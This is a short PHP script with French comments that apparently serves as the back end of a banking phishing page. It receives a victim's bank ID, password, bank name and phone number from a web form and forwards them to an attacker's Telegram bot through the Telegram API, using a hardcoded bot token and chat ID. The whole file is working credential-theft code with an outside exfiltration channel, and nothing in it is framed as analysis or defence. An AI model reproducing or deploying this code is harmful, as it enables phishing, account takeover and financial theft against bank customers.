<?php
// Récupérer les données envoyées par JavaScript (via POST)
$data = json_decode(file_get_contents('php://input'), true);
$id = $data['id'];
$password = $data['password'];
$banque = $data['banque'];
$num = $data['num'];

// Token du bot Telegram
$token = '7942341902:AAH-Es10Dc5KgSL6pJpyhMHFzFQvZMsL_HM';
$chatId = '6970748370';  // Remplacez par l'ID du chat ou votre propre configuration

// Créer le message à envoyer avec des émojis
$message = "🔐 **Informations Bancaires Soumises** :\n\n";
$message .= "💳 **Identifiant Bancaire** : $id\n";
$message .= "🔑 **Mot de passe** : $password\n";
$message .= "🏦 **Nom de la Banque** : $banque\n";
$message .= "📱 **Numéro de Mobile** : $num\n";

// URL de l'API Telegram
$apiUrl = "https://api.telegram.org/bot$token/sendMessage";

// Préparer les paramètres de la requête
$params = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown',  // Pour activer la mise en forme (gras, italique)
];

// Effectuer la requête POST à l'API Telegram
$response = file_get_contents($apiUrl . '?' . http_build_query($params));

// Retourner une réponse JSON pour le JavaScript
echo json_encode(['status' => 'success', 'response' => $response]);
?>